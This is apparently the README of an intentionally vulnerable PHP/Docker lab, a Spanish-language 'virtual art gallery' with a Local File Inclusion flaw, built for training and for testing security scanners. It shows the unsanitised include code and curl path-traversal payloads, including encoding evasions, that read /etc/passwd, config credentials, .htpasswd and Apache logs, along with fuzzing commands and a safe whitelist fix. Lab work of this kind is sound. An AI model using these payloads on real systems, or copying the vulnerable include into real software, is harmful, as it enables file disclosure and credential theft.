# 🎨 Galería de Arte Virtual - Laboratorio LFI

Aplicación web intencionalmente vulnerable a **Local File Inclusion (LFI)** para propósitos educativos y pruebas de seguridad.

⚠️ **ADVERTENCIA**: Este laboratorio contiene vulnerabilidades INTENCIONALES. NO utilizar en producción.

## 📋 Descripción

Esta es una galería de arte virtual simple desarrollada con PHP y Apache que contiene una vulnerabilidad de Local File Inclusion (LFI). El propósito es proporcionar un entorno controlado para:

- Aprender sobre vulnerabilidades LFI
- Probar herramientas de análisis de seguridad
- Desarrollar y testear servidores MCP de seguridad
- Practicar técnicas de pentesting

## 🏗️ Estructura del Proyecto

```
lfi/
├── Dockerfile                 # Imagen Docker con Apache y PHP
├── docker-compose.yml         # Configuración de despliegue
├── README.md                  # Este archivo
└── www/                       # Código fuente de la aplicación
    ├── index.php              # Página principal
    ├── gallery.php            # Página VULNERABLE a LFI
    ├── config.php             # Archivo de configuración con "secretos"
    ├── info.php               # PHPInfo (creado automáticamente)
    └── pages/                 # Páginas de contenido
        ├── modern.php
        ├── classic.php
        ├── abstract.php
        └── about.php
```

## 🚀 Despliegue

### Requisitos Previos

1. Docker y Docker Compose instalados
2. Red Docker `br_vuln` creada (si no existe, créala primero)

### Crear la Red Docker (si no existe)

```bash
docker network create --driver bridge --subnet=172.19.0.0/16 br_vuln
```

### Levantar el Contenedor

```bash
# Desde el directorio /home/kali/Desktop/Vulnerabilities/lfi
docker-compose up -d --build
```

### Verificar el Despliegue

```bash
# Verificar que el contenedor está corriendo
docker ps | grep lfi-gallery

# Verificar la IP asignada
docker inspect lfi-gallery | grep IPAddress
```

### Acceder a la Aplicación

- **URL Local**: http://localhost:8081
- **URL por IP**: http://172.19.0.11
- **Página vulnerable**: http://localhost:8081/gallery.php?page=modern

## 🔓 Vulnerabilidad LFI

### Descripción de la Vulnerabilidad

El archivo `gallery.php` acepta un parámetro GET llamado `page` sin ninguna validación o sanitización:

```php
$page = $_GET['page'] ?? 'modern';
$file = "pages/" . $page . ".php";
include($file);
```

Esto permite a un atacante incluir archivos arbitrarios del sistema mediante path traversal.

### Ejemplos de Explotación

#### 1. Leer archivos de sistema (Linux)

```bash
# Leer /etc/passwd
curl "http://172.19.0.11/gallery.php?page=../../../../etc/passwd"

# Leer /etc/hosts
curl "http://172.19.0.11/gallery.php?page=../../../../etc/hosts"
```

#### 2. Leer archivos de la aplicación

```bash
# Leer config.php (contiene credenciales)
curl "http://172.19.0.11/gallery.php?page=../config"

# Leer archivo .htpasswd
curl "http://172.19.0.11/gallery.php?page=../.htpasswd"
```

#### 3. Acceder a logs de Apache

```bash
# Logs de acceso
curl "http://172.19.0.11/gallery.php?page=../../../../var/log/apache2/access.log"

# Logs de error
curl "http://172.19.0.11/gallery.php?page=../../../../var/log/apache2/error.log"
```

#### 4. Técnicas de evasión

```bash
# Null byte (en versiones antiguas de PHP)
curl "http://172.19.0.11/gallery.php?page=../../../../etc/passwd%00"

# URL encoding
curl "http://172.19.0.11/gallery.php?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# Double encoding
curl "http://172.19.0.11/gallery.php?page=..%252F..%252F..%252F..%252Fetc%252Fpasswd"
```

#### 5. Usar con herramientas de pentesting

```bash
# Con wfuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  "http://172.19.0.11/gallery.php?page=FUZZ"

# Con ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u "http://172.19.0.11/gallery.php?page=FUZZ"

# Con Burp Suite
# Configurar proxy y analizar las peticiones
```

## 🧪 Testing con MCP Server

Este laboratorio está diseñado para ser analizado por servidores MCP de seguridad. Algunos tests que debería detectar:

1. **Detección de parámetros vulnerables**: El parámetro `page` en `gallery.php`
2. **Path Traversal**: Intentos de salir del directorio actual con `../`
3. **Acceso a archivos sensibles**: `/etc/passwd`, logs, archivos de configuración
4. **Lack of input validation**: No hay validación en la entrada del usuario
5. **Information disclosure**: PHPInfo accesible en `/info.php`

### Ejemplo de Análisis Esperado

Un buen escáner debería reportar:

- ✅ Vulnerabilidad LFI en `gallery.php?page=`
- ✅ Exposición de archivos sensibles (`/etc/passwd`, `config.php`)
- ✅ Falta de whitelist para archivos incluibles
- ✅ PHPInfo expuesto
- ✅ Posible escalación a RCE (Remote Code Execution) via log poisoning

## 🛠️ Comandos Útiles

### Gestión del Contenedor

```bash
# Ver logs
docker logs lfi-gallery

# Acceder al contenedor
docker exec -it lfi-gallery bash

# Reiniciar el contenedor
docker-compose restart

# Detener el contenedor
docker-compose down

# Reconstruir y levantar
docker-compose up -d --build --force-recreate
```

### Análisis de Red

```bash
# Verificar conectividad
ping 172.19.0.11

# Escanear puertos
nmap -sV 172.19.0.11

# Analizar con nikto
nikto -h http://172.19.0.11
```

## 📚 Recursos Educativos

### Sobre LFI

- [OWASP - File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - File Inclusion/Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

### Mitigaciones

Para prevenir LFI en aplicaciones reales:

1. **Whitelist de archivos**: Solo permitir nombres específicos
2. **Validación estricta**: No permitir caracteres como `../` o null bytes
3. **Usar rutas absolutas**: Evitar concatenación directa de paths
4. **Deshabilitar funciones peligrosas**: `allow_url_include`, `allow_url_fopen`
5. **Principle of Least Privilege**: Limitar permisos del servidor web

```php
// Ejemplo de código seguro
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages)) {
    die('Invalid page');
}

$file = __DIR__ . "/pages/" . basename($page) . ".php";
if (file_exists($file)) {
    include($file);
}
```

## 📊 Archivos de Interés para Testing

Archivos que deberían ser detectables por un buen escáner:

- `/etc/passwd` - Lista de usuarios del sistema
- `/etc/hosts` - Configuración de hosts
- `/var/log/apache2/access.log` - Logs de acceso (puede usarse para log poisoning)
- `/var/log/apache2/error.log` - Logs de errores
- `../config.php` - Credenciales y claves secretas
- `../.htpasswd` - Archivo de contraseñas
- `/var/www/secret.txt` - Archivo secreto de prueba
- `/var/www/html/info.php` - PHPInfo

## 🔐 Notas de Seguridad

1. **Solo para laboratorio**: Este entorno NO debe exponerse a Internet
2. **Red aislada**: Usar siempre en una red Docker aislada
3. **No reutilizar credenciales**: Las credenciales son de ejemplo únicamente
4. **Destruir después del uso**: Eliminar el contenedor cuando termines las pruebas

## 🤝 Contribuciones

Este es un laboratorio educativo. Si encuentras formas de mejorar la experiencia de aprendizaje o añadir vectores de ataque adicionales, las sugerencias son bienvenidas.

## 📝 Licencia

Este proyecto es para fines educativos únicamente. Usar de forma responsable y ética.

---

**Creado para**: Testing de servidores MCP de análisis de vulnerabilidades
**Última actualización**: 2025
